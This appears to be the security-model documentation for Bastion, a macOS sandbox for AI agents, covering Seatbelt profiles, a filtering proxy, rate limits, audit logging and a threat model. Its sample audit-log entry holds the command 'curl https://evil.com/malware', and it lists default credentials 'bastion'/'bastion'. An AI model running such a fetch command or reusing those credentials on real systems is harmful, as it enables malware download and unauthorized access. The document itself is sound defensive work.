# Bastion Security Model

## Overview

Bastion provides enterprise-grade security for AI agent execution on macOS through multiple layers of defense:

1. **Process Isolation** — Seatbelt (sandbox-exec)
2. **Network Control** — HTTP Proxy
3. **Resource Limits** — Budget enforcement
4. **Audit Logging** — Full execution tracking

---

## Process Isolation

### Seatbelt Integration

Bastion uses macOS's native **Seatbelt** (sandbox-exec) for kernel-level process isolation. This is the same technology used by Safari, iMessage, and other macOS security-critical applications.

### How It Works

When executing a command, Bastion invokes:

```bash
sandbox-exec -p <profile.sb> <command>
```

The profile (`.sb` file) defines what the process can and cannot do.

### Profile Types

#### Default Profile (`default.sb`)

```scheme
(version 1)
(deny default)                    ; Deny everything by default
(allow process-exec*)            ; Allow executing binaries
(allow process-fork*)             ; Allow fork for subshells
(allow file-read* (regex #"^/tmp/"))    ; Read /tmp
(allow file-read* (regex #"^/var/folders/")) ; Read var/folders
(allow file-write* (regex #"^/tmp/"))   ; Write /tmp only
(deny file-read* (regex #"^/System/"))  ; Block System
(deny file-read* (regex #"^/Library/")) ; Block Library
(allow network*)                  ; Allow network (via proxy)
```

**Use case:** General AI agent execution with balanced security.

#### Strict Profile (`strict.sb`)

```scheme
(version 1)
(deny default)
(allow process-exec* (regex #"^/bin/"))    ; Only system binaries
(allow process-exec* (regex #"^/usr/bin/"))
(deny process-fork*)                       ; No subprocesses
(allow file-read* (regex #"^/tmp/"))      ; Read only
(deny file-write*)                         ; No writes
(allow network (local ip))                  ; Local only
(deny network* (remote ip))                 ; No remote network
```

**Use case:** Maximum isolation for untrusted code.

#### Permissive Profile (`permissive.sb`)

```scheme
(version 1)
(deny default)
(allow process-exec*)              ; Allow any execution
(allow process-fork*)              ; Allow any forking
(allow file-read*)                  ; Read anything
(allow file-write*)                 ; Write anything
(allow network*)                    ; Full network access
```

**Use case:** Development/testing only. **Not for production.**

---

## Network Control

### Why a Proxy?

macOS doesn't have Linux's network namespaces, so we can't isolate network at the kernel level. Instead, Bastion runs a local HTTP proxy that all agent traffic must pass through.

### Architecture

```
┌─────────────┐     ┌─────────────┐     ┌─────────────────┐
│    Agent    │────▶│   Bastion   │────▶│   Internet      │
│  (OpenClaw) │     │   Proxy     │     │  (Allowed)      │
└─────────────┘     └─────────────┘     └─────────────────┘
                    │         │
                    │         │
                    ▼         ▼
              ┌─────────┐ ┌─────────┐
              │  Audit  │ │  Rules  │
              │  Log    │ │ Engine  │
              └─────────┘ └─────────┘
```

### Proxy Features

1. **Domain Block/Allow** — Whitelist or blacklist specific domains
2. **Request Logging** — Every HTTP request is logged
3. **Response Logging** — Every HTTP response is logged
4. **Rate Limiting** — Limit requests per agent
5. **Content Filtering** — Block specific content types

### Default Network Rules

```toml
[proxy]
allowed_domains = [
    "*.openai.com",
    "*.anthropic.com",
    "*.github.com"
]
blocked_domains = []
```

---

## Resource Limits

### Budget System

Bastion enforces resource limits per agent:

| Limit | Default | Configurable |
|-------|---------|--------------|
| Commands/hour | 100 | Yes |
| Concurrent agents | 10 | Yes |
| Exec timeout | 30s | Per-request |
| Memory limit | N/A (Seatbelt) | Profile-based |

### Rate Limiting

When an agent exceeds its rate limit:
1. API returns `429 Too Many Requests`
2. Agent is notified
3. Logged to audit trail

---

## Audit Trail

### What's Logged

Every command execution records:

```json
{
  "timestamp": "2026-03-27T10:30:00Z",
  "agent_id": "agent-abc123",
  "command": "curl https://evil.com/malware",
  "exit_code": 0,
  "duration_ms": 150,
  "profile": "default"
}
```

### Log Storage

- **Location:** `~/.bastion/logs/`
- **Format:** JSON lines (one per line)
- **Retention:** Configurable (default: 30 days)
- **Access:** Via API only (`GET /api/audit`)

---

## Authentication

### HTTP Basic Auth

All API endpoints (except `/api/health`) require HTTP Basic Authentication.

```bash
curl -u bastion:bastion localhost:7575/api/agents
```

### Credential Storage

Credentials are stored in `~/.bastion/config.toml`:

```toml
[auth]
username = "bastion"
password = "bastion"  # Change in production!
```

**Security Note:** Change default credentials in production!

---

## Security Checklist

### For Development

- [ ] Use `permissive` profile for testing
- [ ] Keep default credentials
- [ ] No network restrictions

### For Production

- [ ] Use `default` or `strict` profile
- [ ] Change default credentials
- [ ] Configure network allow/block lists
- [ ] Enable rate limiting
- [ ] Review audit logs regularly
- [ ] Use HTTPS for proxy (future)

---

## Threat Model

### What Bastion Protects Against

| Threat | Protection |
|--------|-------------|
| Malicious commands | Seatbelt process isolation |
| Data exfiltration | Network proxy + logging |
| Resource exhaustion | Budget + timeout limits |
| Unauthorized access | HTTP Basic Auth |
| Audit evasion | Full command logging |

### What Bastion Doesn't Protect Against

| Threat | Mitigation |
|--------|------------|
| Local privilege escalation | Use separate user account |
| Side-channel attacks | Enable firewall |
| Rootkit-level compromise | Use strict profile |

---

## Future Security Enhancements

1. **Encrypted Config** — Store credentials encrypted at rest
2. **mTLS** — Mutual TLS for API authentication
3. **Signature Verification** — Verify agent identity
4. **Syscall Monitoring** — Real-time syscall audit
5. **Seccomp** — Linux compatibility (future)

---

## Reporting Security Issues

If you discover a security vulnerability in Bastion:

1. **Don't** open a public GitHub issue
2. **Email:** security@bastion.sh
3. **Include:** Details, reproduction steps, potential impact

We aim to respond within 48 hours and provide a timeline for the fix.